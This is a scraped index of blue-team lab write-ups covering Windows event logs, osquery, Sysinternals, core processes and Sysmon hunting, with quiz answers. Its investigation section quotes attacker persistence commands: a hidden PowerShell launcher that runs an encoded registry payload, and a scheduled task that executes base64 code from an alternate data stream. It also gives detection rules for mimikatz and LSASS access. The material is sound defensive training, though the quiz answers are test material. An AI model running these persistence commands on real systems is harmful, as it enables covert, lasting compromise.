    "objectID": "2582b001b46073085d485abdca6cff3b",
    "u": "https://edr.tymyrddin.dev/docs/wlogs/scenarios",
    "t": "Scenarios ",
    "c": "Scenarios  These scenarios/questions are based on an external event log file titled merged.evtx . Scenario 1  The server admins have made numerous complaints to Management regarding PowerShell being blocked in the environment. Management finally approved the usage of PowerShell within the environment. Visibility is now needed to ensure there are no gaps in coverage. You researched this topic: what logs to look at, what event IDs to monitor, etc. You enabled PowerShell logging on a test machine and had a colleague execute various commands. What event ID is to detect a PowerShell downgrade attack? Detecting and Preventing PowerShell Downgrade Attacks Answer: 400 What is the Date and Time this attack took place? MM/DD/YYYY H:MM:SS [AM/PM] Filter on eventID 400: Answer: 12/18/2020 7:50:33 AM Scenario 2  The Security Team is using Event Logs more. They want to ensure they can monitor if event logs are cleared. You assigned a colleague to execute this action. A Log clear event was recorded. What is the ‘Event Record ID’? The clear log is a Task Category: Answer: 27736 What is the name of the computer? Answer: PC01.example.corp Scenario 3  The threat intel team shared its research on Emotet. They advised searching for event ID 4104 and the text ScriptBlockText within the EventData element. Find the encoded PowerShell payload. What is the name of the first variable within the PowerShell command? Filter on source PowerShell and scroll down to the first event: Answer: $Va5w3n8 What is the Date and Time this attack took place? MM/DD/YYYY H:MM:SS [AM/PM] Answer: 8/25/2020 10:09:28 PM What is the Execution Process ID? Answer: 6620 Scenario 4  A report came in that an intern was suspected of running unusual commands on her machine, such as enumerating members of the Administrators group. A senior analyst suggested searching for C:\\Windows\\System32\\net1.exe . Confirm the suspicion. What is the Group Security ID of the group she enumerated? Enumeration involves Event ID 4798 and 4799. We are looking for the activity affecting a group, filter on 4799 and view the earliest entry. Check Details and it will be the TargetSid. Windows Security Log Event ID 4799 -> Answer: S-1-5-32-544 What is the event ID? Answer: 4799 Resources  EVTX Attack Samples (a few were used in this room) PowerShell <3 the Blue Team Tampering with Windows Event Tracing: Background, Offense, and Defense",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "29bbf1fdc6c8f702decbc319b9b1c322",
    "u": "https://edr.tymyrddin.dev/docs/osquery/queries",
    "t": "Creating queries ",
    "c": "Creating queries  The SQL language implemented in Osquery is a superset of SQLite. All queries will start with a SELECT statement. There is no updating or deleting any information/data on the endpoint. The exception to the rule: Using other SQL statements, such as UPDATE and DELETE, is possible, but only when creating run-time tables (views) or using an extension if the extension supports them. Queries will also include a FROM clause and end with a semicolon. Exploring installed programs  To retrieve all the information about the installed programs on the endpoint ( LIMIT limits the results to display): osquery>select * from programs limit 1; name = 7-Zip 21.07 (x64) version = 21.07 install_location = C:\\Program Files\\7-Zip\\ install_source = language = publisher = Igor Pavlov uninstall_string = \"C:\\Program Files\\7-Zip\\Uninstall.exe\" install_date = identifying_number = To select specific columns rather than retrieve every column in the table: osquery>select name, version, install_location, install_date from programs limit 1; name = 7-Zip 21.07 (x64) version = 21.07 install_location = C:\\Program Files\\7-Zip\\ install_date = Count  To see how many programs or entries in any table are returned: osquery>select count(*) from programs; count(*) = 160 WHERE clause  To get the user table and only display the result for the user James: osquery>SELECT * FROM users WHERE username='James'; uid = 1002 gid = 544 uid_signed = 1002 gid_signed = 544 username = James description = directory = C:\\Users\\James shell = C:\\Windows\\system32\\cmd.exe uuid = S-1-5-21-605937711-2036809076-574958819-1002 type = local The equal sign is not the only filtering option in a WHERE clause: The equal sign is not the only filtering option in a WHERE clause. Below are filtering operators that can be used in a WHERE clause: Sign Meaning = equal <> not equal >, >= greater than, greater than, or equal to <, <= less than or less than or equal to BETWEEN between a range LIKE pattern wildcard searches % wildcard, multiple characters _ wildcard, one character Matching wildcard rules  String Meaning % Match all files and folders for one level %% Match all files and folders recursively %abc Match all within-level ending in \"abc\" abc% Match all within-level starting with \"abc\" Examples: String Meaning /Users/%/Library Monitor for changes to every user's Library folder, but not the contents within /Users/%/Library/ Monitor for changes to files within each Library folder, but not the contents of their subdirectories /Users/%/Library/% Same, changes to files within each Library folder /Users/%/Library/%% Monitor changes recursively within each Library /bin/%sh Monitor the bin directory for changes ending in sh Some tables require a WHERE clause, such as the file table, to return a value. If the required WHERE clause is not included in the query, osquery will give an error. osquery>select * from file; W1017 12:38:29.730041 45744 virtual_table.cpp:965] Table file was queried without a required column in the WHERE clause W1017 12:38:29.730041 45744 virtual_table.cpp:976] Please see the table documentation: https://osquery.io/schema/#file Error: constraint failed Joining tables  Osquery can also be used to join two tables based on a column that is shared by both tables. osquery>.schema users CREATE TABLE users(`uid` BIGINT, `gid` BIGINT, `uid_signed` BIGINT, `gid_signed` BIGINT, `username` TEXT, `description` TEXT, `directory` TEXT, `shell` TEXT, `uuid` TEXT, `type` TEXT, `is_hidden` INTEGER HIDDEN, `pid_with_namespace` INTEGER HIDDEN, PRIMARY KEY (`uid`, `username`, `uuid`, `pid_with_namespace`)) WITHOUT ROWID; osquery>.schema processes CREATE TABLE processes(`pid` BIGINT, `name` TEXT, `path` TEXT, `cmdline` TEXT, `state` TEXT, `cwd` TEXT, `root` TEXT, `uid` BIGINT, `gid` BIGINT, `euid` BIGINT, `egid` BIGINT, `suid` BIGINT, `sgid` BIGINT, `on_disk` INTEGER, `wired_size` BIGINT, `resident_size` BIGINT, `total_size` BIGINT, `user_time` BIGINT, `system_time` BIGINT, `disk_bytes_read` BIGINT, `disk_bytes_written` BIGINT, `start_time` BIGINT, `parent` BIGINT, `pgroup` BIGINT, `threads` INTEGER, `nice` INTEGER, `elevated_token` INTEGER, `secure_process` INTEGER, `protection_type` TEXT, `virtual_process` INTEGER, `elapsed_time` BIGINT, `handle_count` BIGINT, `percent_processor_time` BIGINT, `upid` BIGINT HIDDEN, `uppid` BIGINT HIDDEN, `cpu_type` INTEGER HIDDEN, `cpu_subtype` INTEGER HIDDEN, `translated` INTEGER HIDDEN, `cgroup_path` TEXT HIDDEN, `phys_footprint` BIGINT HIDDEN, PRIMARY KEY (`pid`)) WITHOUT ROWID; Looking at both schemas, uid in users table is meant to identify the user record, and in the processes table, the column uid represents the user responsible for executing the particular process. The tables can be joined using this uid field: $ osqueryi Using a virtual database. Need help, type '.help' osquery>select p.pid, p.name, p.path, u.username from processes p JOIN users u on u.uid=p.uid LIMIT 10; +-------+-------------------+---------------------------------------+----------+ | pid | name | path | username | +-------+-------------------+---------------------------------------+----------+ | 7560 | sihost.exe | C:\\Windows\\System32\\sihost.exe | James | | 6984 | svchost.exe | C:\\Windows\\System32\\svchost.exe | James | | 7100 | svchost.exe | C:\\Windows\\System32\\svchost.exe | James | | 7144 | svchost.exe | C:\\Windows\\System32\\svchost.exe | James | | 8636 | ctfmon.exe | C:\\Windows\\System32\\ctfmon.exe | James | | 8712 | taskhostw.exe | C:\\Windows\\System32\\taskhostw.exe | James | | 9260 | svchost.exe | C:\\Windows\\System32\\svchost.exe | James | | 10168 | RuntimeBroker.exe | C:\\Windows\\System32\\RuntimeBroker.exe | James | | 10232 | RuntimeBroker.exe | C:\\Windows\\System32\\RuntimeBroker.exe | James | | 8924 | svchost.exe | C:\\Windows\\System32\\svchost.exe | James | +-------+-------------------+---------------------------------------+----------+ Example use  A table autoexec contains the list of executables that are automatically executed on the target machine. There seems to be a batch file that runs automatically. What is the name of that batch file (with the extension .bat)? What is the full path of the batch file found in the above question? osquery> .schema autoexec CREATE TABLE autoexec(`path` TEXT, `name` TEXT, `source` TEXT, PRIMARY KEY (`path`)) WITHOUT ROWID; osquery> select * from autoexec WHERE name LIKE '%.bat'; +---------------------------------------------------------------------------------------------+----------------+---------------+ | path | name | source | +---------------------------------------------------------------------------------------------+----------------+---------------+ | C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\batstartup.bat | batstartup.bat | startup_items | | C:\\Users\\James\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\batstartup.bat | batstartup.bat | startup_items | +---------------------------------------------------------------------------------------------+----------------+---------------+ osquery>",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "b1849ec76cd44ec860e38469a19b5ce8",
    "u": "https://edr.tymyrddin.dev/docs/core/explorer",
    "t": "explorer.exe ",
    "c": "explorer.exe  Windows Explorer, explorer.exe , gives the user access to their folders and files. It also provides functionality for other features, such as the Start Menu and Taskbar. The Winlogon process runs userinit.exe , which launches the value in HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell . userinit.exe exits after spawning explorer.exe . Because of this, the parent process is non-existent. There will be many child processes for explorer.exe . Normal  Image Path: %SystemRoot%\\explorer.exe Parent Process: Created by userinit.exe and exits Number of Instances: One or more per interactively logged-in user User Account: Logged-in user(s) Start Time: First instance when the first interactive user logon session begins Unusual  An actual parent process. ( userinit.exe calls this process and exits) Image file path other than C:\\Windows Running as an unknown user Subtle misspellings to hide rogue processes in plain sight Outbound TCP/IP connections",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "43ee75ea041035d8665e5b4a7f85ba42",
    "u": "https://edr.tymyrddin.dev/docs/core/svchost",
    "t": "svchost.exe ",
    "c": "svchost.exe  The Service Host (Host Process for Windows Services), or svchost.exe , is responsible for hosting and managing Windows services. The services running in this process are implemented as DLLs. The DLL to implement is stored in the registry for the service under the Parameters subkey in ServiceDLL . The full path is HKLM\\SYSTEM\\CurrentControlSet\\Services\\SERVICE NAME\\Parameters . There is always a key identifier in the binary path, and that identifier is -k . This is how a legitimate svchost.exe process is called. The -k parameter is for grouping similar services to share the same process. This concept was based on the OS design and implemented to reduce resource consumption. Starting from Windows 10 Version 1703, services grouped into host processes changed. On machines running more than 3.5 GB of memory, each service will run its own process. Since svchost.exe will always have multiple running processes on any Windows system, this process has been a target for malicious use. Adversaries create malware to masquerade as this process and try to hide amongst the legitimate svchost.exe processes. They can name the malware svchost.exe or misspell it slightly, such as scvhost.exe . By doing so, the intention is to go under the radar. Another tactic is to install/call a malicious service (DLL). Normal  Image Path: %SystemRoot%\\System32\\svchost.exe Parent Process: services.exe Number of Instances: Many User Account: Varies (SYSTEM, Network Service, Local Service) depending on the svchost.exe instance. In Windows 10, some instances run as the logged-in user. Start Time: Typically within seconds of boot time. Other instances of svchost.exe can be started after boot. Unusual  A parent process other than services.exe Image file path other than C:\\Windows\\System32 Subtle misspellings to hide rogue processes in plain sight The absence of the -k parameter Resources  svchost.exe The typographical and homomorphic abuse of svchost.exe, and other popular file names",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "2e1d218625344b25c78c9f22410e7575",
    "u": "https://edr.tymyrddin.dev/docs/wlogs/readme",
    "t": "Introduction ",
    "c": "THM Room: Windows event logs Introduction  What?  Windows Event Logs and the tools to query them. Why?  To understand the activity of the system, diagnose problems, and to combine log file entries from multiple sources with statistical analysis, to yield correlations between seemingly unrelated events on different servers. How?  Event logs XPath queries Scenarios",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "56490d9dd8ed09d88fa5e36310a1f65e",
    "u": "https://edr.tymyrddin.dev/docs/sysinternals/misc",
    "t": "Miscellaneous ",
    "c": "Miscellaneous  BgInfo  “It automatically displays relevant information about a Windows computer on the desktop’s background, such as the computer name, IP address, service pack version, and more.” (official definition) RegJump  “This little command-line applet takes a registry path and makes Regedit open to that path. It accepts root keys in standard (e.g. HKEY_LOCAL_MACHINE) and abbreviated form (e.g. HKLM).” (official definition) Strings  “Strings just scans the file you pass it for UNICODE (or ASCII) strings of a default length of 3 or more UNICODE (or ASCII) characters. Note that it works under Windows 95 as well.” (official definition) Question  Run the Strings tool on ZoomIt.exe . What is the full path to the .pdb file? C:\\Tools\\sysint>strings .\\zoomit.exe | findstr /i .pdb",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "87f411ac2cb9eeda1bbced5abd202c15",
    "u": "https://edr.tymyrddin.dev/docs/sysinternals/file",
    "t": "File and disk utilities ",
    "c": "File and disk utilities  Sigcheck  “ Sigcheck is a command-line utility that shows file version number, timestamp information, and digital signature details, including certificate chains. It also includes an option to check a file’s status on VirusTotal, a site that performs automated file scanning against over 40 antivirus engines, and an option to upload a file for scanning.” (official definition). Example: sigcheck -u -e c:\\windows\\system32 And investigate the purpose of any files that are not signed. Streams  “The NTFS file system provides applications the ability to create alternate data streams of information. By default, all data is stored in a file’s main unnamed data stream, but by using the syntax file:stream , you are able to read and write to alternates.” (official definition) Alternate Data Streams (ADS) is a file attribute specific to Windows NTFS (New Technology File System). Every file has at least one data stream ( $DATA ) and ADS allows files to contain more than one stream of data. Natively Window Explorer doesn’t display ADS to the user. There are 3rd party executables that can be used to view this data, but Powershell gives you the ability to view ADS for files. Malware writers have used ADS to hide data in an endpoint, but not all its uses are malicious. When you download a file from the Internet unto an endpoint, there are identifiers written to ADS to identify that it was downloaded from the Internet. Question  There is a txt file on the desktop named file.txt . Using one of the three tools, what is the text within the ADS? Open a cmd : C:\\Users\\Administrator>cd desktop C:\\Users\\Administrator>stream file.txt There is an ads.txt inside. C:\\Users\\Administrator>notepad file.txt:ads.txt Answer: I am hiding in the stream. SDelete  “ SDelete is a command line utility that takes a number of options. In any given use, it allows you to delete one or more files and/or directories, or to cleanse the free space on a logical disk.” SDelete (Secure Delete) implements the DOD 5220.22-M (Department of Defense clearing and sanitizing protocol) and has been used by adversaries and is associated with MITRE techniques T1485 (Data Destruction) and T1070.004 (Indicator Removal on Host: File Deletion) in MITRE ID S0195 .",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "a9f6264140f9cf4a8cf0001e18b98ef7",
    "u": "https://edr.tymyrddin.dev/docs/core/wininit",
    "t": "wininit.exe ",
    "c": "wininit.exe  The Windows Initialization Process, wininit.exe , is responsible for launching services.exe (Service Control Manager), lsass.exe (Local Security Authority), and lsaiso.exe within Session 0. It is another critical Windows process that runs in the background, along with its child processes. Note: lsaiso.exe is a process associated with Credential Guard and KeyGuard. You will only see this process if Credential Guard is enabled. Normal  Image Path: %SystemRoot%\\System32\\wininit.exe Parent Process: Created by an instance of smss.exe Number of Instances: One User Account: Local System Start Time: Within seconds of boot time Unusual  An actual parent process. ( smss.exe calls this process and self-terminates) Image file path other than C:\\Windows\\System32 Subtle misspellings to hide rogue processes in plain sight Multiple running instances Not running as SYSTEM",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "ef7e14492265cef68c99c4dfe71a4322",
    "u": "https://edr.tymyrddin.dev/docs/sysmon/readme",
    "t": "Introduction ",
    "c": "THM Room: Sysmon Introduction  What?  Sysmon (SysInternals Suite) can be used for monitoring and logging events on Windows endpoints and environments. Why?  To detect malicious activity by tracking code and network traffic. How?  Event IDs Cutting out the noise Hunting metasploit Detecting mimikatz Hunting malware Hunting persistence Detecting evasion techniques Practical investigations",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "ee71201e1dac2df234be7e1a92e6e00a",
    "u": "https://edr.tymyrddin.dev/docs/sysmon/mimikatz",
    "t": "Detecting mimikatz ",
    "c": "Detecting mimikatz  Mimikatz is well known and commonly used to dump credentials from memory along with other Windows post-exploitation activity. Mimikatz is mainly known for dumping LSASS. We can hunt for the file created, execution of the file from an elevated process, creation of a remote thread, and processes that Mimikatz creates. Anti-Virus will typically pick up Mimikatz as the signature is very well known, but it is still possible for threat actors to obfuscate or use droppers to get the file onto the device. Mimikatz file creation config  The first method of hunting for mimikatz is just looking for files created with its name. This is a simple technique and can allow you to find anything that might have bypassed AV. Most of the time when dealing with an advanced threat more advanced hunting techniques like searching for LSASS behaviour are needed. <RuleGroup name=\"\" groupRelation=\"or\"> <FileCreate onmatch=\"include\"> <TargetFileName condition=\"contains\">mimikatz</TargetFileName> </FileCreate> </RuleGroup> Abnormal LSASS behaviour config  We can use the ProcessAccess event ID to hunt for abnormal LSASS behavior. This would show potential LSASS abuse which usually connects back to mimikatz or some other kind of credential dumping tool. If LSASS is accessed by a process other than svchost.exe it should be considered suspicious behaviour and should be investigated further. To aid in looking for suspicious events, use a filter to only look for processes besides svchost.exe . Sysmon will provide further details to help lead the investigation such as the file path the process originated from. To aid in detections, use a custom configuration file: <RuleGroup name=\"\" groupRelation=\"or\"> <ProcessAccess onmatch=\"include\"> <TargetImage condition=\"image\">lsass.exe</TargetImage> </ProcessAccess> </RuleGroup> Obfuscated version of mimikatz dumping credentials  Open C:\\Users\\THM-Analyst\\Desktop\\Scenarios\\Practice\\Hunting_LSASS.evtx in Event Viewer to view an attack using an obfuscated version of mimikatz to dump credentials from memory. The event shows the mimikatz process accessed, and there are also a lot of svchost.exe events. Alter the config to exclude events with the SourceImage event coming from svhost.exe : <RuleGroup name=\"\" groupRelation=\"or\"> <ProcessAccess onmatch=\"exclude\"> <SourceImage condition=\"image\">svchost.exe</SourceImage> </ProcessAccess> <ProcessAccess onmatch=\"include\"> <TargetImage condition=\"image\">lsass.exe</TargetImage> </ProcessAccess> </RuleGroup> Detecting LSASS Behavior with PowerShell  Use the same XPath queries used in the rule to filter out the other processes from TargetImage . Get-WinEvent -Path <Path to Log> -FilterXPath '*/System/EventID=10 and */EventData/Data[@Name=\"TargetImage\"] and */EventData/Data=\"C:\\Windows\\system32\\lsass.exe\"' Resources  MITRE ATT&CK T1055 MITRE ATT&CK S0002",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "725fc50ef8e0e0cea0c73220e349adbf",
    "u": "https://edr.tymyrddin.dev/docs/sysinternals/network",
    "t": "Networking utilities ",
    "c": "Networking utilities  TCPView  “ TCPView is a Windows program that will show detailed listings of all TCP and UDP endpoints on your system, including the local and remote addresses and state of TCP connections. On Windows Server 2008, Vista, and XP, TCPView also reports the name of the process that owns the endpoint. TCPView provides a more informative and conveniently presented subset of the Netstat program that ships with Windows. The TCPView download includes Tcpvcon , a command-line version with the same functionality.” (official definition) Windows has a built-in utility that provides the same functionality. This tool is called Resource Monitor. There are many ways to open this tool. From the command line use resmon . Question  Using WHOIS tools, what is the ISP/Organization for the remote address in the screenshot? With Listen unselected in the Connection States from the States Filter and UDP v4 and UDP v6 turned off from the top toolbar. whois 52.154.170.73 ... NetRange: 52.145.0.0 - 52.191.255.255 CIDR: 52.148.0.0/14, 52.160.0.0/11, 52.152.0.0/13, 52.146.0.0/15, 52.145.0.0/16 NetName: MSFT NetHandle: NET-52-145-0-0-1 Parent: NET52 (NET-52-0-0-0-0) NetType: Direct Allocation OriginAS: Organization: Microsoft Corporation (MSFT) RegDate: 2015-11-24 Updated: 2021-12-14 Ref: https://rdap.arin.net/registry/ip/52.145.0.0 ... Answer: Microsoft Corporation",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "b7459cc600f6f86ba330cb481df106e1",
    "u": "https://edr.tymyrddin.dev/docs/sysmon/noise",
    "t": "Cutting out the noise ",
    "c": "Cutting out the noise  Since most of the normal activity or “noise” seen on a network is excluded or filtered out with Sysmon we are able to focus on meaningful events. This allows us to quickly identify and investigate suspicious activity. When actively monitoring a network you will want to use multiple detections and techniques simultaneously in an effort to identify threats. Best Practices  Sysmon offers a fairly open and configurable platform. There are a few best practices that can be implemented to ensure operating efficiently and not missing any potential threats. Exclude > Include: When creating rules for the Sysmon configuration file, exclude events rather than include events. This prevents you from accidentally missing crucial events and only seeing the events that matter the most. CLI gives you further control: As is common with most applications the CLI gives you the most control and filtering, allowing for further granular control. You can use either Get-WinEvent or wevutil.exe to access and filter logs. When Sysmon is used with a SIEM or other detection solutions these tools will become less used and needed. Knowing the environment is important when implementing any platform or tool. Have a firm understanding of the network or environment you are working within to fully understand what is normal and what is suspicious in order to effectively craft rules. Filtering events with Event Viewer  Event Viewer might not the best for filtering events and out-of-the-box offers limited control over logs. The main filter you will be using with Event Viewer is by EventID and keywords. You can also choose to filter by writing XML but this is a tedious process that does not scale well. To open the filter menu select Filter Current Log from the Actions menu. Filtering events with PowerShell  To view and filter events with PowerShell, use Get-WinEvent with XPath queries . We can use any XPath queries that can be found in the XML view of events. We will be using wevutil.exe to view events once filtered. The command line is preferred over the Event Viewer GUI as it allows for further granular control and filtering. Some basic filters: Filter by Event ID: */System/EventID=<ID> Filter by XML Attribute/Name: */EventData/Data[@Name=\"<XML Attribute/Name>\"] Filter by Event Data: */EventData/Data=<Data> Putting these filters together with attributes and data will get the most control out of the logs. As an example of using Get-WinEvent to look for network connections coming from port 4444: Get-WinEvent -Path <Path to Log> -FilterXPath '*/System/EventID=3 and */EventData/Data[@Name=\"DestinationPort\"] and */EventData/Data=4444' Questions  How many event ID 3 events are in C:\\Users\\THM-Analyst\\Desktop\\Scenarios\\Practice\\Filtering.evtx ? Open the Filtering.evtx file and in the Event Viewer App under Saved logs, click Filtering, and filter the current log by ID 3 : Answer: 73,591 What is the UTC time created of the first network event in C:\\Users\\THM-Analyst\\Desktop\\Scenarios\\Practice\\Filtering.evtx ? Scroll to the bottom of the list, click on the last row, in the middle bottom panel under General you will find the UTC time for the event. Answer: 2021-01-06 01:35:50.464",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "48792259d46ec07f71b7308b9a9fff5f",
    "u": "https://edr.tymyrddin.dev/docs/sysmon/investigations",
    "t": "Practical investigations ",
    "c": "Practical investigations  ugh, BILL THAT’S THE WRONG USB!  In this investigation, your team has received reports that a malicious file was dropped onto a host by a malicious USB. They have pulled the logs suspected and have tasked you with running the investigation for it. Logs are located in C:\\Users\\THM-Analyst\\Desktop\\Scenarios\\Investigations\\Investigation-1.evtx . Questions  What is the full registry key of the USB device calling svchost.exe ? In Event Viewer, look at the logs for the category called Registry value set (rule: registryEvent). There are two entries for EventID 13 . The first one is for the UWDFHost.exe , which is used to communicate with hardware devices and to load drivers. The second entry is where the USB device calls the svchost.exe . The TargetObject value contains the full registry key. With PowerShell: Get-WinEvent -Path <Path to evtx file> -FilterXPath '*/System/EventID=13 and */EventData/Data[@Name=\"Image\"]=\"C:\\Windows\\system32\\svchost.exe\"' | FL Answer: HKLM\\System\\CurrentControlSet\\Enum\\WpdBusEnumRoot\\UMB\\2&37c186b&0&STORAGE#VOLUME #_??_USBSTOR#DISK&VEN_SANDISK&PROD_U3_CRUZER_MICRO&REV_8.01#4054910EF19005B3&0#\\FriendlyName What is the device name when being called by RawAccessRead? In Event Viewer, look at EventID 9 (RawAccessRead detected). Task categories RawAccessRead . In Friendly View you can see the Device being called. With PowerShell: Get-WinEvent -Path <Path to evtx file> -FilterXPath '*/System/EventID=9' | FL Answer: \\Device\\HarddiskVolume3 What is the first exe the process executes? Arrange entries in Event Viewer by Oldest to Latest events. EventID 1 is the first process that explorer.exe creates, right after EventID 9 for RawAccessRead of explorer.exe . This shows it is rundll32.exe which is executed. Answer: rundll32.exe This isn’t an HTML file?  Another suspicious file has appeared in your logs and has managed to execute code masking itself as an HTML file, evading your antivirus detections. Open the logs and investigate the suspicious file. Logs are located in C:\\Users\\THM-Analyst\\Desktop\\Scenarios\\Investigations\\Investigation-2.evtx . Questions  What is the full path of the payload? The latest process created contains the full path under CommandLine (at the bottom). With PowerShell (view the EventID 1 entries): Get-WinEvent -Path <Path to evtx file> -FilterXPath '*/System/EventID=1' | FL Answer: C:\\Users\\IEUser\\AppData\\Local\\Microsoft\\Windows\\Temporary Internet Files\\Content.IE5\\S97WTYG7\\update.hta What is the full path of the file the payload masked itself as? Answer: C:\\Users\\IEUser\\Downloads\\update.html What signed binary executed the payload? MITRE ATT&CK: System Binary Proxy Execution: Mshta : Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. With PowerShell: Get-WinEvent -Path C:\\evtxfiles\\Investigation-2.evtx -FilterXPath '*/System/EventID=1' | FL Answer: C:\\Windows\\System32\\mshta.exe What is the IP of the adversary? Look at the only other EventID 3 (Network connection detected). Find the Destination Port . With PowerShell: Get-WinEvent -Path C:\\evtxfiles\\Investigation-2.evtx -FilterXPath '*/System/EventID=3' | FL Answer: 10.0.2.18 What back connect port is used? Answer: 4443 Where’s the bouncer when you need him  Your team has informed you that the adversary has managed to set up persistence on your endpoints as they continue to move throughout your network. Find how the adversary managed to gain persistence using logs provided. Logs are located in C:\\Users\\THM-Analyst\\Desktop\\Scenarios\\Investigations\\Investigation-3.1.evtx and C:\\Users\\THM-Analyst\\Desktop\\Scenarios\\Investigations\\Investigation-3.2.evtx . Questions  What is the IP of the suspected adversary? A C2 is a term commonly used as an abbreviation for Command-and-Control which is the endpoint that an attacker uses to maintain communications, and send commands to a target system or network that is compromised by malware. With PowerShell, filter by EventID 3 (Network connection detected): Get-WinEvent -Path <Path to evtx file> -FilterXPath '*/System/EventID=3' | FL Answer: 172.30.1.253 What is the hostname of the affected endpoint? Answer: DESKTOP-O153T4R What is the hostname of the C2 server connecting to the endpoint? Answer: Empirec2 Where in the registry was the payload stored? Look for EventID 13 (Registry value set) for the stored payload. With PowerShell: Get-WinEvent -Path C:\\thmsysmon\\Investigations\\Investigation-3.1.evtx -FilterXPath '*/System/EventID=13' | FL Answer: HKLM\\SOFTWARE\\Microsoft\\Network\\debug What PowerShell launch code was used to launch the payload? Second Event ID 13. With PowerShell: Get-WinEvent -Path C:\\thmsysmon\\Investigations\\Investigation-3.1.evtx -FilterXPath '*/System/EventID=13' | FL Answer: \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -c \"$x=$((gp HKLM:Software\\Microsoft\\Network debug).debug);start -Win Hidden -A \\\"-enc $x\\\" powershell\";exit; What is the IP of the adversary? Not found in Hostname , but in DestinationPort . Answer: 172.168.103.188 What is the full path of the payload location? Instead of hiding in the registry, hides in a process, EventID 1 (Process Create). Answer: c:\\users\\q\\AppData:blah.txt What was the full command used to create the scheduled task? In PowerShell, filter by EventID 1 and Image . Get-WinEvent -Path <Path to evtx file> -FilterXPath '*/System/EventID=1 and */EventData/Data[@Name=\"Image\"]=\"C:\\Windows\\System32\\schtasks.exe\"' | FL Answer: \"C:\\WINDOWS\\system32\\schtasks.exe\" /Create /F /SC DAILY /ST 09:00 /TN Updater /TR \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NonI -W hidden -c \\\"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String($(cmd /c \"more < c:\\users\\q\\AppData:blah.txt\"’))))\\\"\" What process was accessed by schtasks.exe that would be considered suspicious behaviour? PowerShell: Get-WinEvent -Path C:\\thmsysmon\\Investigations\\Investigation-3.2.evtx -FilterXPath '*/System/EventID=10 and */EventData/Data[@Name=\"SourceImage\"]=\"C:\\WINDOWS\\system32\\lsass.exe\"' | fl Answer: lsass.exe Mom look! I built a botnet!  As the adversary has gained a solid foothold onto your network it has been brought to your attention that they may have been able to set up C2 communications on some endpoints. Collect the logs and continue your investigation. Logs are located in C:\\Users\\THM-Analyst\\Desktop\\Scenarios\\Investigations\\Investigation-4.evtx . Questions  What is the IP of the adversary? Get-WinEvent -Path Investigation-4.evtx -FilterXPath '*/System/EventID=3' | FL Answer: 172.30.1.253 What port is the adversary operating on? Answer: 80 What C2 is the adversary utilizing? Answer: empire",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "4e08292fc4ff20d9508eed5c678bc814",
    "u": "https://edr.tymyrddin.dev/docs/core/csrss",
    "t": "csrss.exe ",
    "c": "csrss.exe  csrss.exe (Client Server Runtime Process) is the user-mode side of the Windows subsystem. This process is always running and is critical to system operation. If this process is terminated by chance, it will result in system failure. This process is responsible for the Win32 console window and process thread creation and deletion. For each instance, csrsrv.dll , basesrv.dll , and winsrv.dll are loaded (along with others). This process is also responsible for making the Windows API available to other processes, mapping drive letters, and handling the Windows shutdown process. Normal  Image Path: %SystemRoot%\\System32\\csrss.exe Parent Process: Created by an instance of smss.exe Number of Instances: Two or more User Account: Local System Start Time: Within seconds of boot time for the first two instances (for Session 0 and 1). Start times for additional instances occur as new sessions are created, although only Sessions 0 and 1 are often created. Unusual  An actual parent process. ( smss.exe calls this process and self-terminates) Image file path other than C:\\Windows\\System32 Subtle misspellings to hide rogue processes masquerading as csrss.exe in plain sight The user is not the SYSTEM user. Resources  Client/Server Runtime Subsystem",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "1342373b3430198b7fd04ff870e8f644",
    "u": "https://edr.tymyrddin.dev/docs/windows/network",
    "t": "Network threat detection ",
    "c": "Network threat detection  SMB/NetBIOS auditing  Logs lateral movement via: NetSessionEnum (detects BloodHound reconnaissance) DsGetDCName (flags Golden Ticket attacks) Critical for Active Directory environments. Enable: auditpol / set / subcategory : \"Network Share\" / success : enable / failure : enable RDP/Suspicious Port Monitoring  Alerts on: Unexpected RDP connections (Event ID 4624) High-volume SMB traffic (potential ransomware) Tools: Azure Sentinel (cloud-native SIEM) Zeek (for network metadata)",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "d2de3a4b3a9be9fbc898145c9df4fc9c",
    "u": "https://edr.tymyrddin.dev/docs/sysmon/malware",
    "t": "Hunting malware ",
    "c": "Hunting malware  Malware has many forms and variations with different end goals. RATs or Remote Access Trojans are used similar to any other payload to gain remote access to a machine. RATs typically come with other antivirus and detection evasion techniques that make them different from other payloads like msfvenom . A RAT typically also uses a Client-Server model and comes with an interface for easy user administration. Examples of RATs are Xeexe and Quasar . To help detect and hunt malware, first identify the malware to hunt for or detect, and identify ways to modify configuration files (hypothesis-based hunting). There are a plethora of other ways to detect and log malware, but here only detecting open back connect ports is covered. Rats and C2 Servers config  This is similar to hunting Metasploit . We can look through and create a configuration file to hunt and detect suspicious ports open on the endpoint. The code snippet is from the Ion-Storm configuration file, and will alert on specific ports like 1034 and 1604 and exclude common network connections like OneDrive. <RuleGroup name=\"\" groupRelation=\"or\"> <NetworkConnect onmatch=\"include\"> <DestinationPort condition=\"is\">1034</DestinationPort> <DestinationPort condition=\"is\">1604</DestinationPort> </NetworkConnect> <NetworkConnect onmatch=\"exclude\"> <Image 